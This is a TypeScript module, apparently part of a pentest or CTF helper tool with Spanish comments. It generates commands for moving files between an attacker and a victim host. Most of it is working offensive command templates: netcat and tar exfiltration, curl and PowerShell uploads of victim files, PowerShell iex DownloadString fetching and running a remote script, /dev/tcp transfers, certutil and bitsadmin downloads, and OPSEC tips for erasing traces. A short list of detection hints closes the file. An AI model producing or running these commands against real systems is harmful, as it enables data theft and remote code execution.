/* File Transfer: comandos para mover ficheros atacante ↔ víctima
   con cada método imaginable, generados según el sentido, la IP
   del atacante y el nombre del fichero. */

export type XferOS = 'linux' | 'windows'
export type XferDir = 'down' | 'up' // down: víctima descarga (de ti) · up: víctima te sube

export interface XferMethod {
  id: string
  label: string
  os: XferOS | 'ambos'
  dir: XferDir | 'ambos'
  needsListener: boolean
  needsClient: boolean
  note?: string
  build: (p: XferParams) => string
}

export interface XferParams {
  host: string
  port: string
  file: string
  outName: string
  localDir?: string
}

export const XFER_METHODS: XferMethod[] = [
  // ── LINUX ──
  { id: 'http-py', label: 'python http.server', os: 'linux', dir: 'down', needsListener: true, needsClient: false,
    note: 'el más rápido para servir una carpeta entera',
    build: (p) => `# atacante (en la carpeta del fichero):\npython3 -m http.server ${p.port}\n\n# víctima:\nwget http://${p.host}:${p.port}/${p.file} -O ${p.outName}\ncurl http://${p.host}:${p.port}/${p.file} -o ${p.outName}` },
  { id: 'http-up', label: 'subida por HTTP (uploadserver)', os: 'linux', dir: 'up', needsListener: true, needsClient: false,
    note: 'requiere el paquete uploadserver (pip install uploadserver)',
    build: (p) => `# atacante:\npython3 -m uploadserver ${p.port}   # acepta POST\n\n# víctima:\ncurl -X POST http://${p.host}:${p.port}/upload -F "files=@${p.file}"` },
  { id: 'nc-down', label: 'netcat directo (sin HTTP)', os: 'linux', dir: 'down', needsListener: true, needsClient: false,
    note: 'cuando no hay wget/curl en la víctima: NC de toda la vida',
    build: (p) => `# víctima (listener que recibe):\nnc -l -p ${p.port} > ${p.outName}\n\n# atacante (envía):\nnc -nv ${p.host} ${p.port} < ${p.file}\n\n# variante con hash on-the-fly (verificación):\n# atacante:  nc -nv ${p.host} ${p.port} < ${p.file} | tee >(md5sum > ${p.file}.md5)\n# víctima:   nc -l -p ${p.port} | tee ${p.outName} | md5sum` },
  { id: 'nc-up', label: 'netcat exfil (víctima envía)', os: 'linux', dir: 'up', needsListener: true, needsClient: false,
    build: (p) => `# atacante (recibe):\nnc -l -p ${p.port} > recibido_${p.outName}\n\n# víctima (envía):\nnc -nv ${p.host} ${p.port} < ${p.file}\n\n# comprimido y en silencio (útil para carpetas):\n# víctima:  tar czf - ${p.file} | nc -nv ${p.host} ${p.port}\n# atacante: nc -l -p ${p.port} | tar xzf -` },
  { id: 'scp', label: 'scp / sftp (con SSH)', os: 'linux', dir: 'ambos', needsListener: false, needsClient: false,
    note: 'si tienes credenciales SSH: el método más fiable y cifrado',
    build: (p) => `# víctima → atacante (subida):\nscp ${p.file} user@${p.host}:/tmp/${p.outName}\n\n# atacante → víctima (descarga):\nscp user@${p.host}:/ruta/${p.file} ${p.outName}\n\n# si el SSH de la víctima solo acepta claves:\nscp -i clave.pem ${p.file} user@${p.host}:/tmp/` },
  { id: 'base64', label: 'base64 inline (por consola)', os: 'linux', dir: 'ambos', needsListener: false, needsClient: false,
    note: 'para ficheros pequeños sin red: pega el base64 por la reverse shell',
    build: (p) => `# víctima (generar):\nbase64 -w0 ${p.file}     # copia la salida\nmd5sum ${p.file}         # apunta el hash\n\n# atacante (reconstruir):\necho "PEGA_EL_BASE64" | base64 -d > ${p.outName}\nmd5sum ${p.outName}      # compara el hash\n\n# límite práctico: <100 KB (el portapapeles y la terminal sufren)` },
  { id: 'devtcp', label: '/dev/tcp (bash puro, sin nc)', os: 'linux', dir: 'down', needsListener: false, needsClient: false,
    note: 'bash builtin: funciona sin nc, wget ni curl (el truco de los boxes capados)',
    build: (p) => `# atacante:\nnc -l -p ${p.port} < ${p.file}\n\n# víctima (bash, sin herramientas):\nexec 3<>/dev/tcp/${p.host}/${p.port} && cat <&3 > ${p.outName} && exec 3<&-` },

  // ── WINDOWS ──
  { id: 'certutil', label: 'certutil (nativo Windows)', os: 'windows', dir: 'down', needsListener: true, needsClient: false,
    note: 'LOLBIN clásico: descarga HTTP sin tocar PowerShell (no es lo que se espera que haga)',
    build: (p) => `# atacante:\npython3 -m http.server ${p.port}\n\n# víctima (cmd):\ncertutil.exe -urlcache -f http://${p.host}:${p.port}/${p.file} ${p.outName}\n\n# limpieza de la caché (OPSEC):\ncertutil.exe -urlcache -f http://${p.host}:${p.port}/${p.file} delete` },
  { id: 'ps-webclient', label: 'PowerShell WebClient', os: 'windows', dir: 'down', needsListener: true, needsClient: false,
    build: (p) => `# víctima (PowerShell):\n(New-Object Net.WebClient).DownloadFile('http://${p.host}:${p.port}/${p.file}', '${p.outName}')\n\n# variante con ScriptBlock (ps1 ejecutable directamente):\niex (New-Object Net.WebClient).DownloadString('http://${p.host}:${p.port}/script.ps1')\n\n# si falla TLS viejo en el servidor:\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` },
  { id: 'ps-up', label: 'PowerShell subida (UploadFile)', os: 'windows', dir: 'up', needsListener: true, needsClient: false,
    build: (p) => `# atacante:\npython3 -m uploadserver ${p.port}\n\n# víctima (PowerShell):\ncurl.exe -X POST http://${p.host}:${p.port}/upload -F "files=@C:\\ruta\\${p.file}"\n# o WebClient completo:\n$d = New-Object System.Net.WebClient\n$d.UploadFile('http://${p.host}:${p.port}/upload', 'C:\\ruta\\${p.file}')` },
  { id: 'smb', label: 'SMB con impacket (y UNC)', os: 'windows', dir: 'ambos', needsListener: true, needsClient: false,
    note: 'sin credenciales para descargar; autenticación solo al subir',
    build: (p) => `# atacante (comparte la carpeta actual):\npython3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2 support ./compartida\n\n# víctima (descarga, SIN credenciales):\ncopy \\\\${p.host}\\support\\${p.file} ${p.outName}\n\n# víctima (subida, con auth):\nnet use \\\\${p.host}\\support /user:user pass\ncopy ${p.file} \\\\${p.host}\\support\\` },
  { id: 'bitsadmin', label: 'bitsadmin (LOLBIN)', os: 'windows', dir: 'down', needsListener: true, needsClient: false,
    note: 'menos monitorizado que certutil en algunas defensas',
    build: (p) => `# víctima (cmd):\nbitsadmin /transfer job http://${p.host}:${p.port}/${p.file} C:\\Users\\Public\\${p.outName}\n\n# PowerShell moderno equivalente:\nStart-BitsTransfer -Source http://${p.host}:${p.port}/${p.file} -Destination C:\\Users\\Public\\${p.outName}` },
  { id: 'nc-win', label: 'nc.exe en Windows', os: 'windows', dir: 'ambos', needsListener: false, needsClient: false,
    note: 'requiere subir nc.exe primero (certutil o PS) — para después exfiltrar con lo mismo',
    build: (p) => `# víctima (recibir):\nnc.exe -lvp ${p.port} > ${p.outName}\n\n# atacante (enviar):\nnc -nv ${p.host} ${p.port} < ${p.file}\n\n# (inverso para exfiltrar: víctima envía, tú escuchas)` },
  { id: 'ftp', label: 'FTP (pyftpdlib / tftp)', os: 'ambos', dir: 'ambos', needsListener: true, needsClient: false,
    note: 'legacy pero presente en Windows XP-7 y algunos appliances',
    build: (p) => `# atacante (servidor FTP):\npython3 -m pyftpdlib -w -p ${p.port}   # -w: escritura anónima\n\n# víctima Windows (cmd):\necho open ${p.host} ${p.port}> ftp.txt\necho anonymous>> ftp.txt\necho bin>> ftp.txt\necho get ${p.file}>> ftp.txt\necho bye>> ftp.txt\nftp -s:ftp.txt\n\n# víctima Linux:\nwget ftp://${p.host}:${p.port}/${p.file}` },
]

export function buildXfer(id: string, p: XferParams): string | null {
  const m = XFER_METHODS.find((x) => x.id === id)
  return m ? m.build(p) : null
}

export const XFER_NOTES: string[] = [
  'Regla OPSEC: cada método deja rastros distintos (certutil cachea, SMB crea sesiones, http.server escribe en access log del SOC).',
  'Verifica SIEMPRE el hash (md5/sha256) en ambos extremos: un fichero truncado por un filtro invisible te hará perder horas.',
  'Para binarios grandes en Windows capado: bitsadmin aguanta reanudación; certutil no.',
  'En CTFs el patrón ganador: python3 -m http.server + wget (Linux) o certutil/PS (Windows).',
  'Si la víctima no puede salir a tu IP (segmentación), invierte el sentido: que TU te conectes a un listener de la víctima (o usa el pivoting con chisel).',
]

export const XFER_DETECTION: [string, string][] = [
  ['certutil -urlcache', 'Event ID 4104 (PS) no aplica; es cmd: monitoriza procesos con command line = certutil + http (Sysmon E1)'],
  ['WebClient DownloadString', 'PowerShell Script Block Logging 4104: patrón DownloadString + http://'],
  ['smbserver.py', 'pico de tráfico SMB 445 desde host inusual + eventos 5140/5145 de share access'],
  ['base64 por consola', 'strings largas (>500 chars) en líneas de comando: regla de SIEM clásica'],
]
